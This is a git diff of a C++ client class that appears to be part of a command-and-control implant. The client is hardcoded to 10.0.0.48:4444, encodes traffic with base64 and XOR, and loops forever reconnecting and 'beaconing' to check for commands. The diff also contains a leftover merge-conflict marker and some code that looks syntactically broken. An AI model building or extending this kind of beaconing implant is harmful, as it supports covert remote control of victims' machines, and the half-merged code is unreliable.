@@ -14,6 +14,8 @@
 #include "ComponentFactory.h"
 #include "TransportLayer.h"
 
+#include <iostream>
+
 
 
 /*
@@ -39,48 +41,60 @@ Client::Client() :
 		"10.0.0.48",
 		"4444",
 		TransportLayerType::TCP,
-		SerializerType::BINARY
+		SerializerType::BINARY,
 		EncoderType::BASE64,
 		EncryptorType::XOR
+		)
 	)
-)
 {
-	//messageHandler_.setTransportLayer(*transportLayer_);
+	messageHandler_.setTransportLayer(*transportLayerPtr_);
+	std::cout << "inside default constructor for client" << std::endl;
 }
 
-Client::Client() :
+Client::Client(
+	const std::string& server,
+	const std::string& port,
+	TransportLayerType transportType,
+	SerializerType serializerType,
+	EncoderType encoderType,
+	EncryptorType encryptorType)
+	:
 	messageHandler_(),
 	transportLayerPtr_(
 		TransportLayerFactory::create(
-		messageHandler_,
-		server,
-		port,
-		transportLayerType::TCP,
-		serializerType::BINARY
-		encoderType::BASE64,
-		encryptorType::XOR
+			messageHandler_,
+			server,
+			port,
+			transportType,
+			serializerType,
+			encoderType,
+			encryptorType)
 	)
-)
 {}
-
-// Constructor with specific transport type
 /*
-Client::Client(TransportLayerType transportType, const std::string& server, const std::string& port) :
-	transportLayer_(TransportLayerFactory::create(messageHandler_, server, port, transportType))
+Client::Client() :
+>>>>>>> 57908ee250d5f635af889a6bc389567a4b68d2ad
+	messageHandler_(),
+	transportLayerPtr_(
+		TransportLayerFactory::create(
+			messageHandler_,
+			host,
+			port,
+			transportType,
+			serializerType,
+			encoderType,
+			encryptorType
+		)
+	)
 {
-	//messageHandler_.setTransportLayer(*transportLayer_);
-}*/
-
-// Constructor with custom transporter (for testing)
-/*
-Client::Client(TransportLayerUniquePtr transporter) :
-	transportLayer_(std::move(transporter))
+	messageHandler_.setTransportLayer(*transportLayerPtr_);
+	std::cout << "inside parameter constructor for client" << std::endl;
+}
+*/
+Client::~Client()
 {
-	//messageHandler_.setTransportLayer(*transportLayer_);
-}*/
-
-
-
+	std::cout << "Client being deconstructed" << std::endl;
+}
 
 bool Client::run()
 {	
@@ -103,14 +117,20 @@ bool Client::run()
 
 	while (true)
 	{
-		if (!transportLayer_->isConnected())
+		if (!transportLayerPtr_->isConnected())
 		{
-			transportLayer_->connect();    // Try to connect (handles if already connected)
+			transportLayerPtr_->connect();    // Try to connect (handles if already connected)
 		}
-		transportLayer_->beacon();     // Send heartbeat + check commands... also receive() is called inside beacon
-		//transporter_.receive();
-		//transporter_.sendMessage();
-		Sleep(5000);            // Wait 1 minute
+		
+		if (transportLayerPtr_->isConnected())
+		{
+			transportLayerPtr_->testMessage();
+			transportLayerPtr_->beacon();     // Send heartbeat + check commands... also receive() is called inside beacon
+			//transporter_.receive();
+			//transporter_.sendMessage();
+		}
+
+		Sleep(5000);            // Wait 5 seconds
 	}
 	return false;
 }
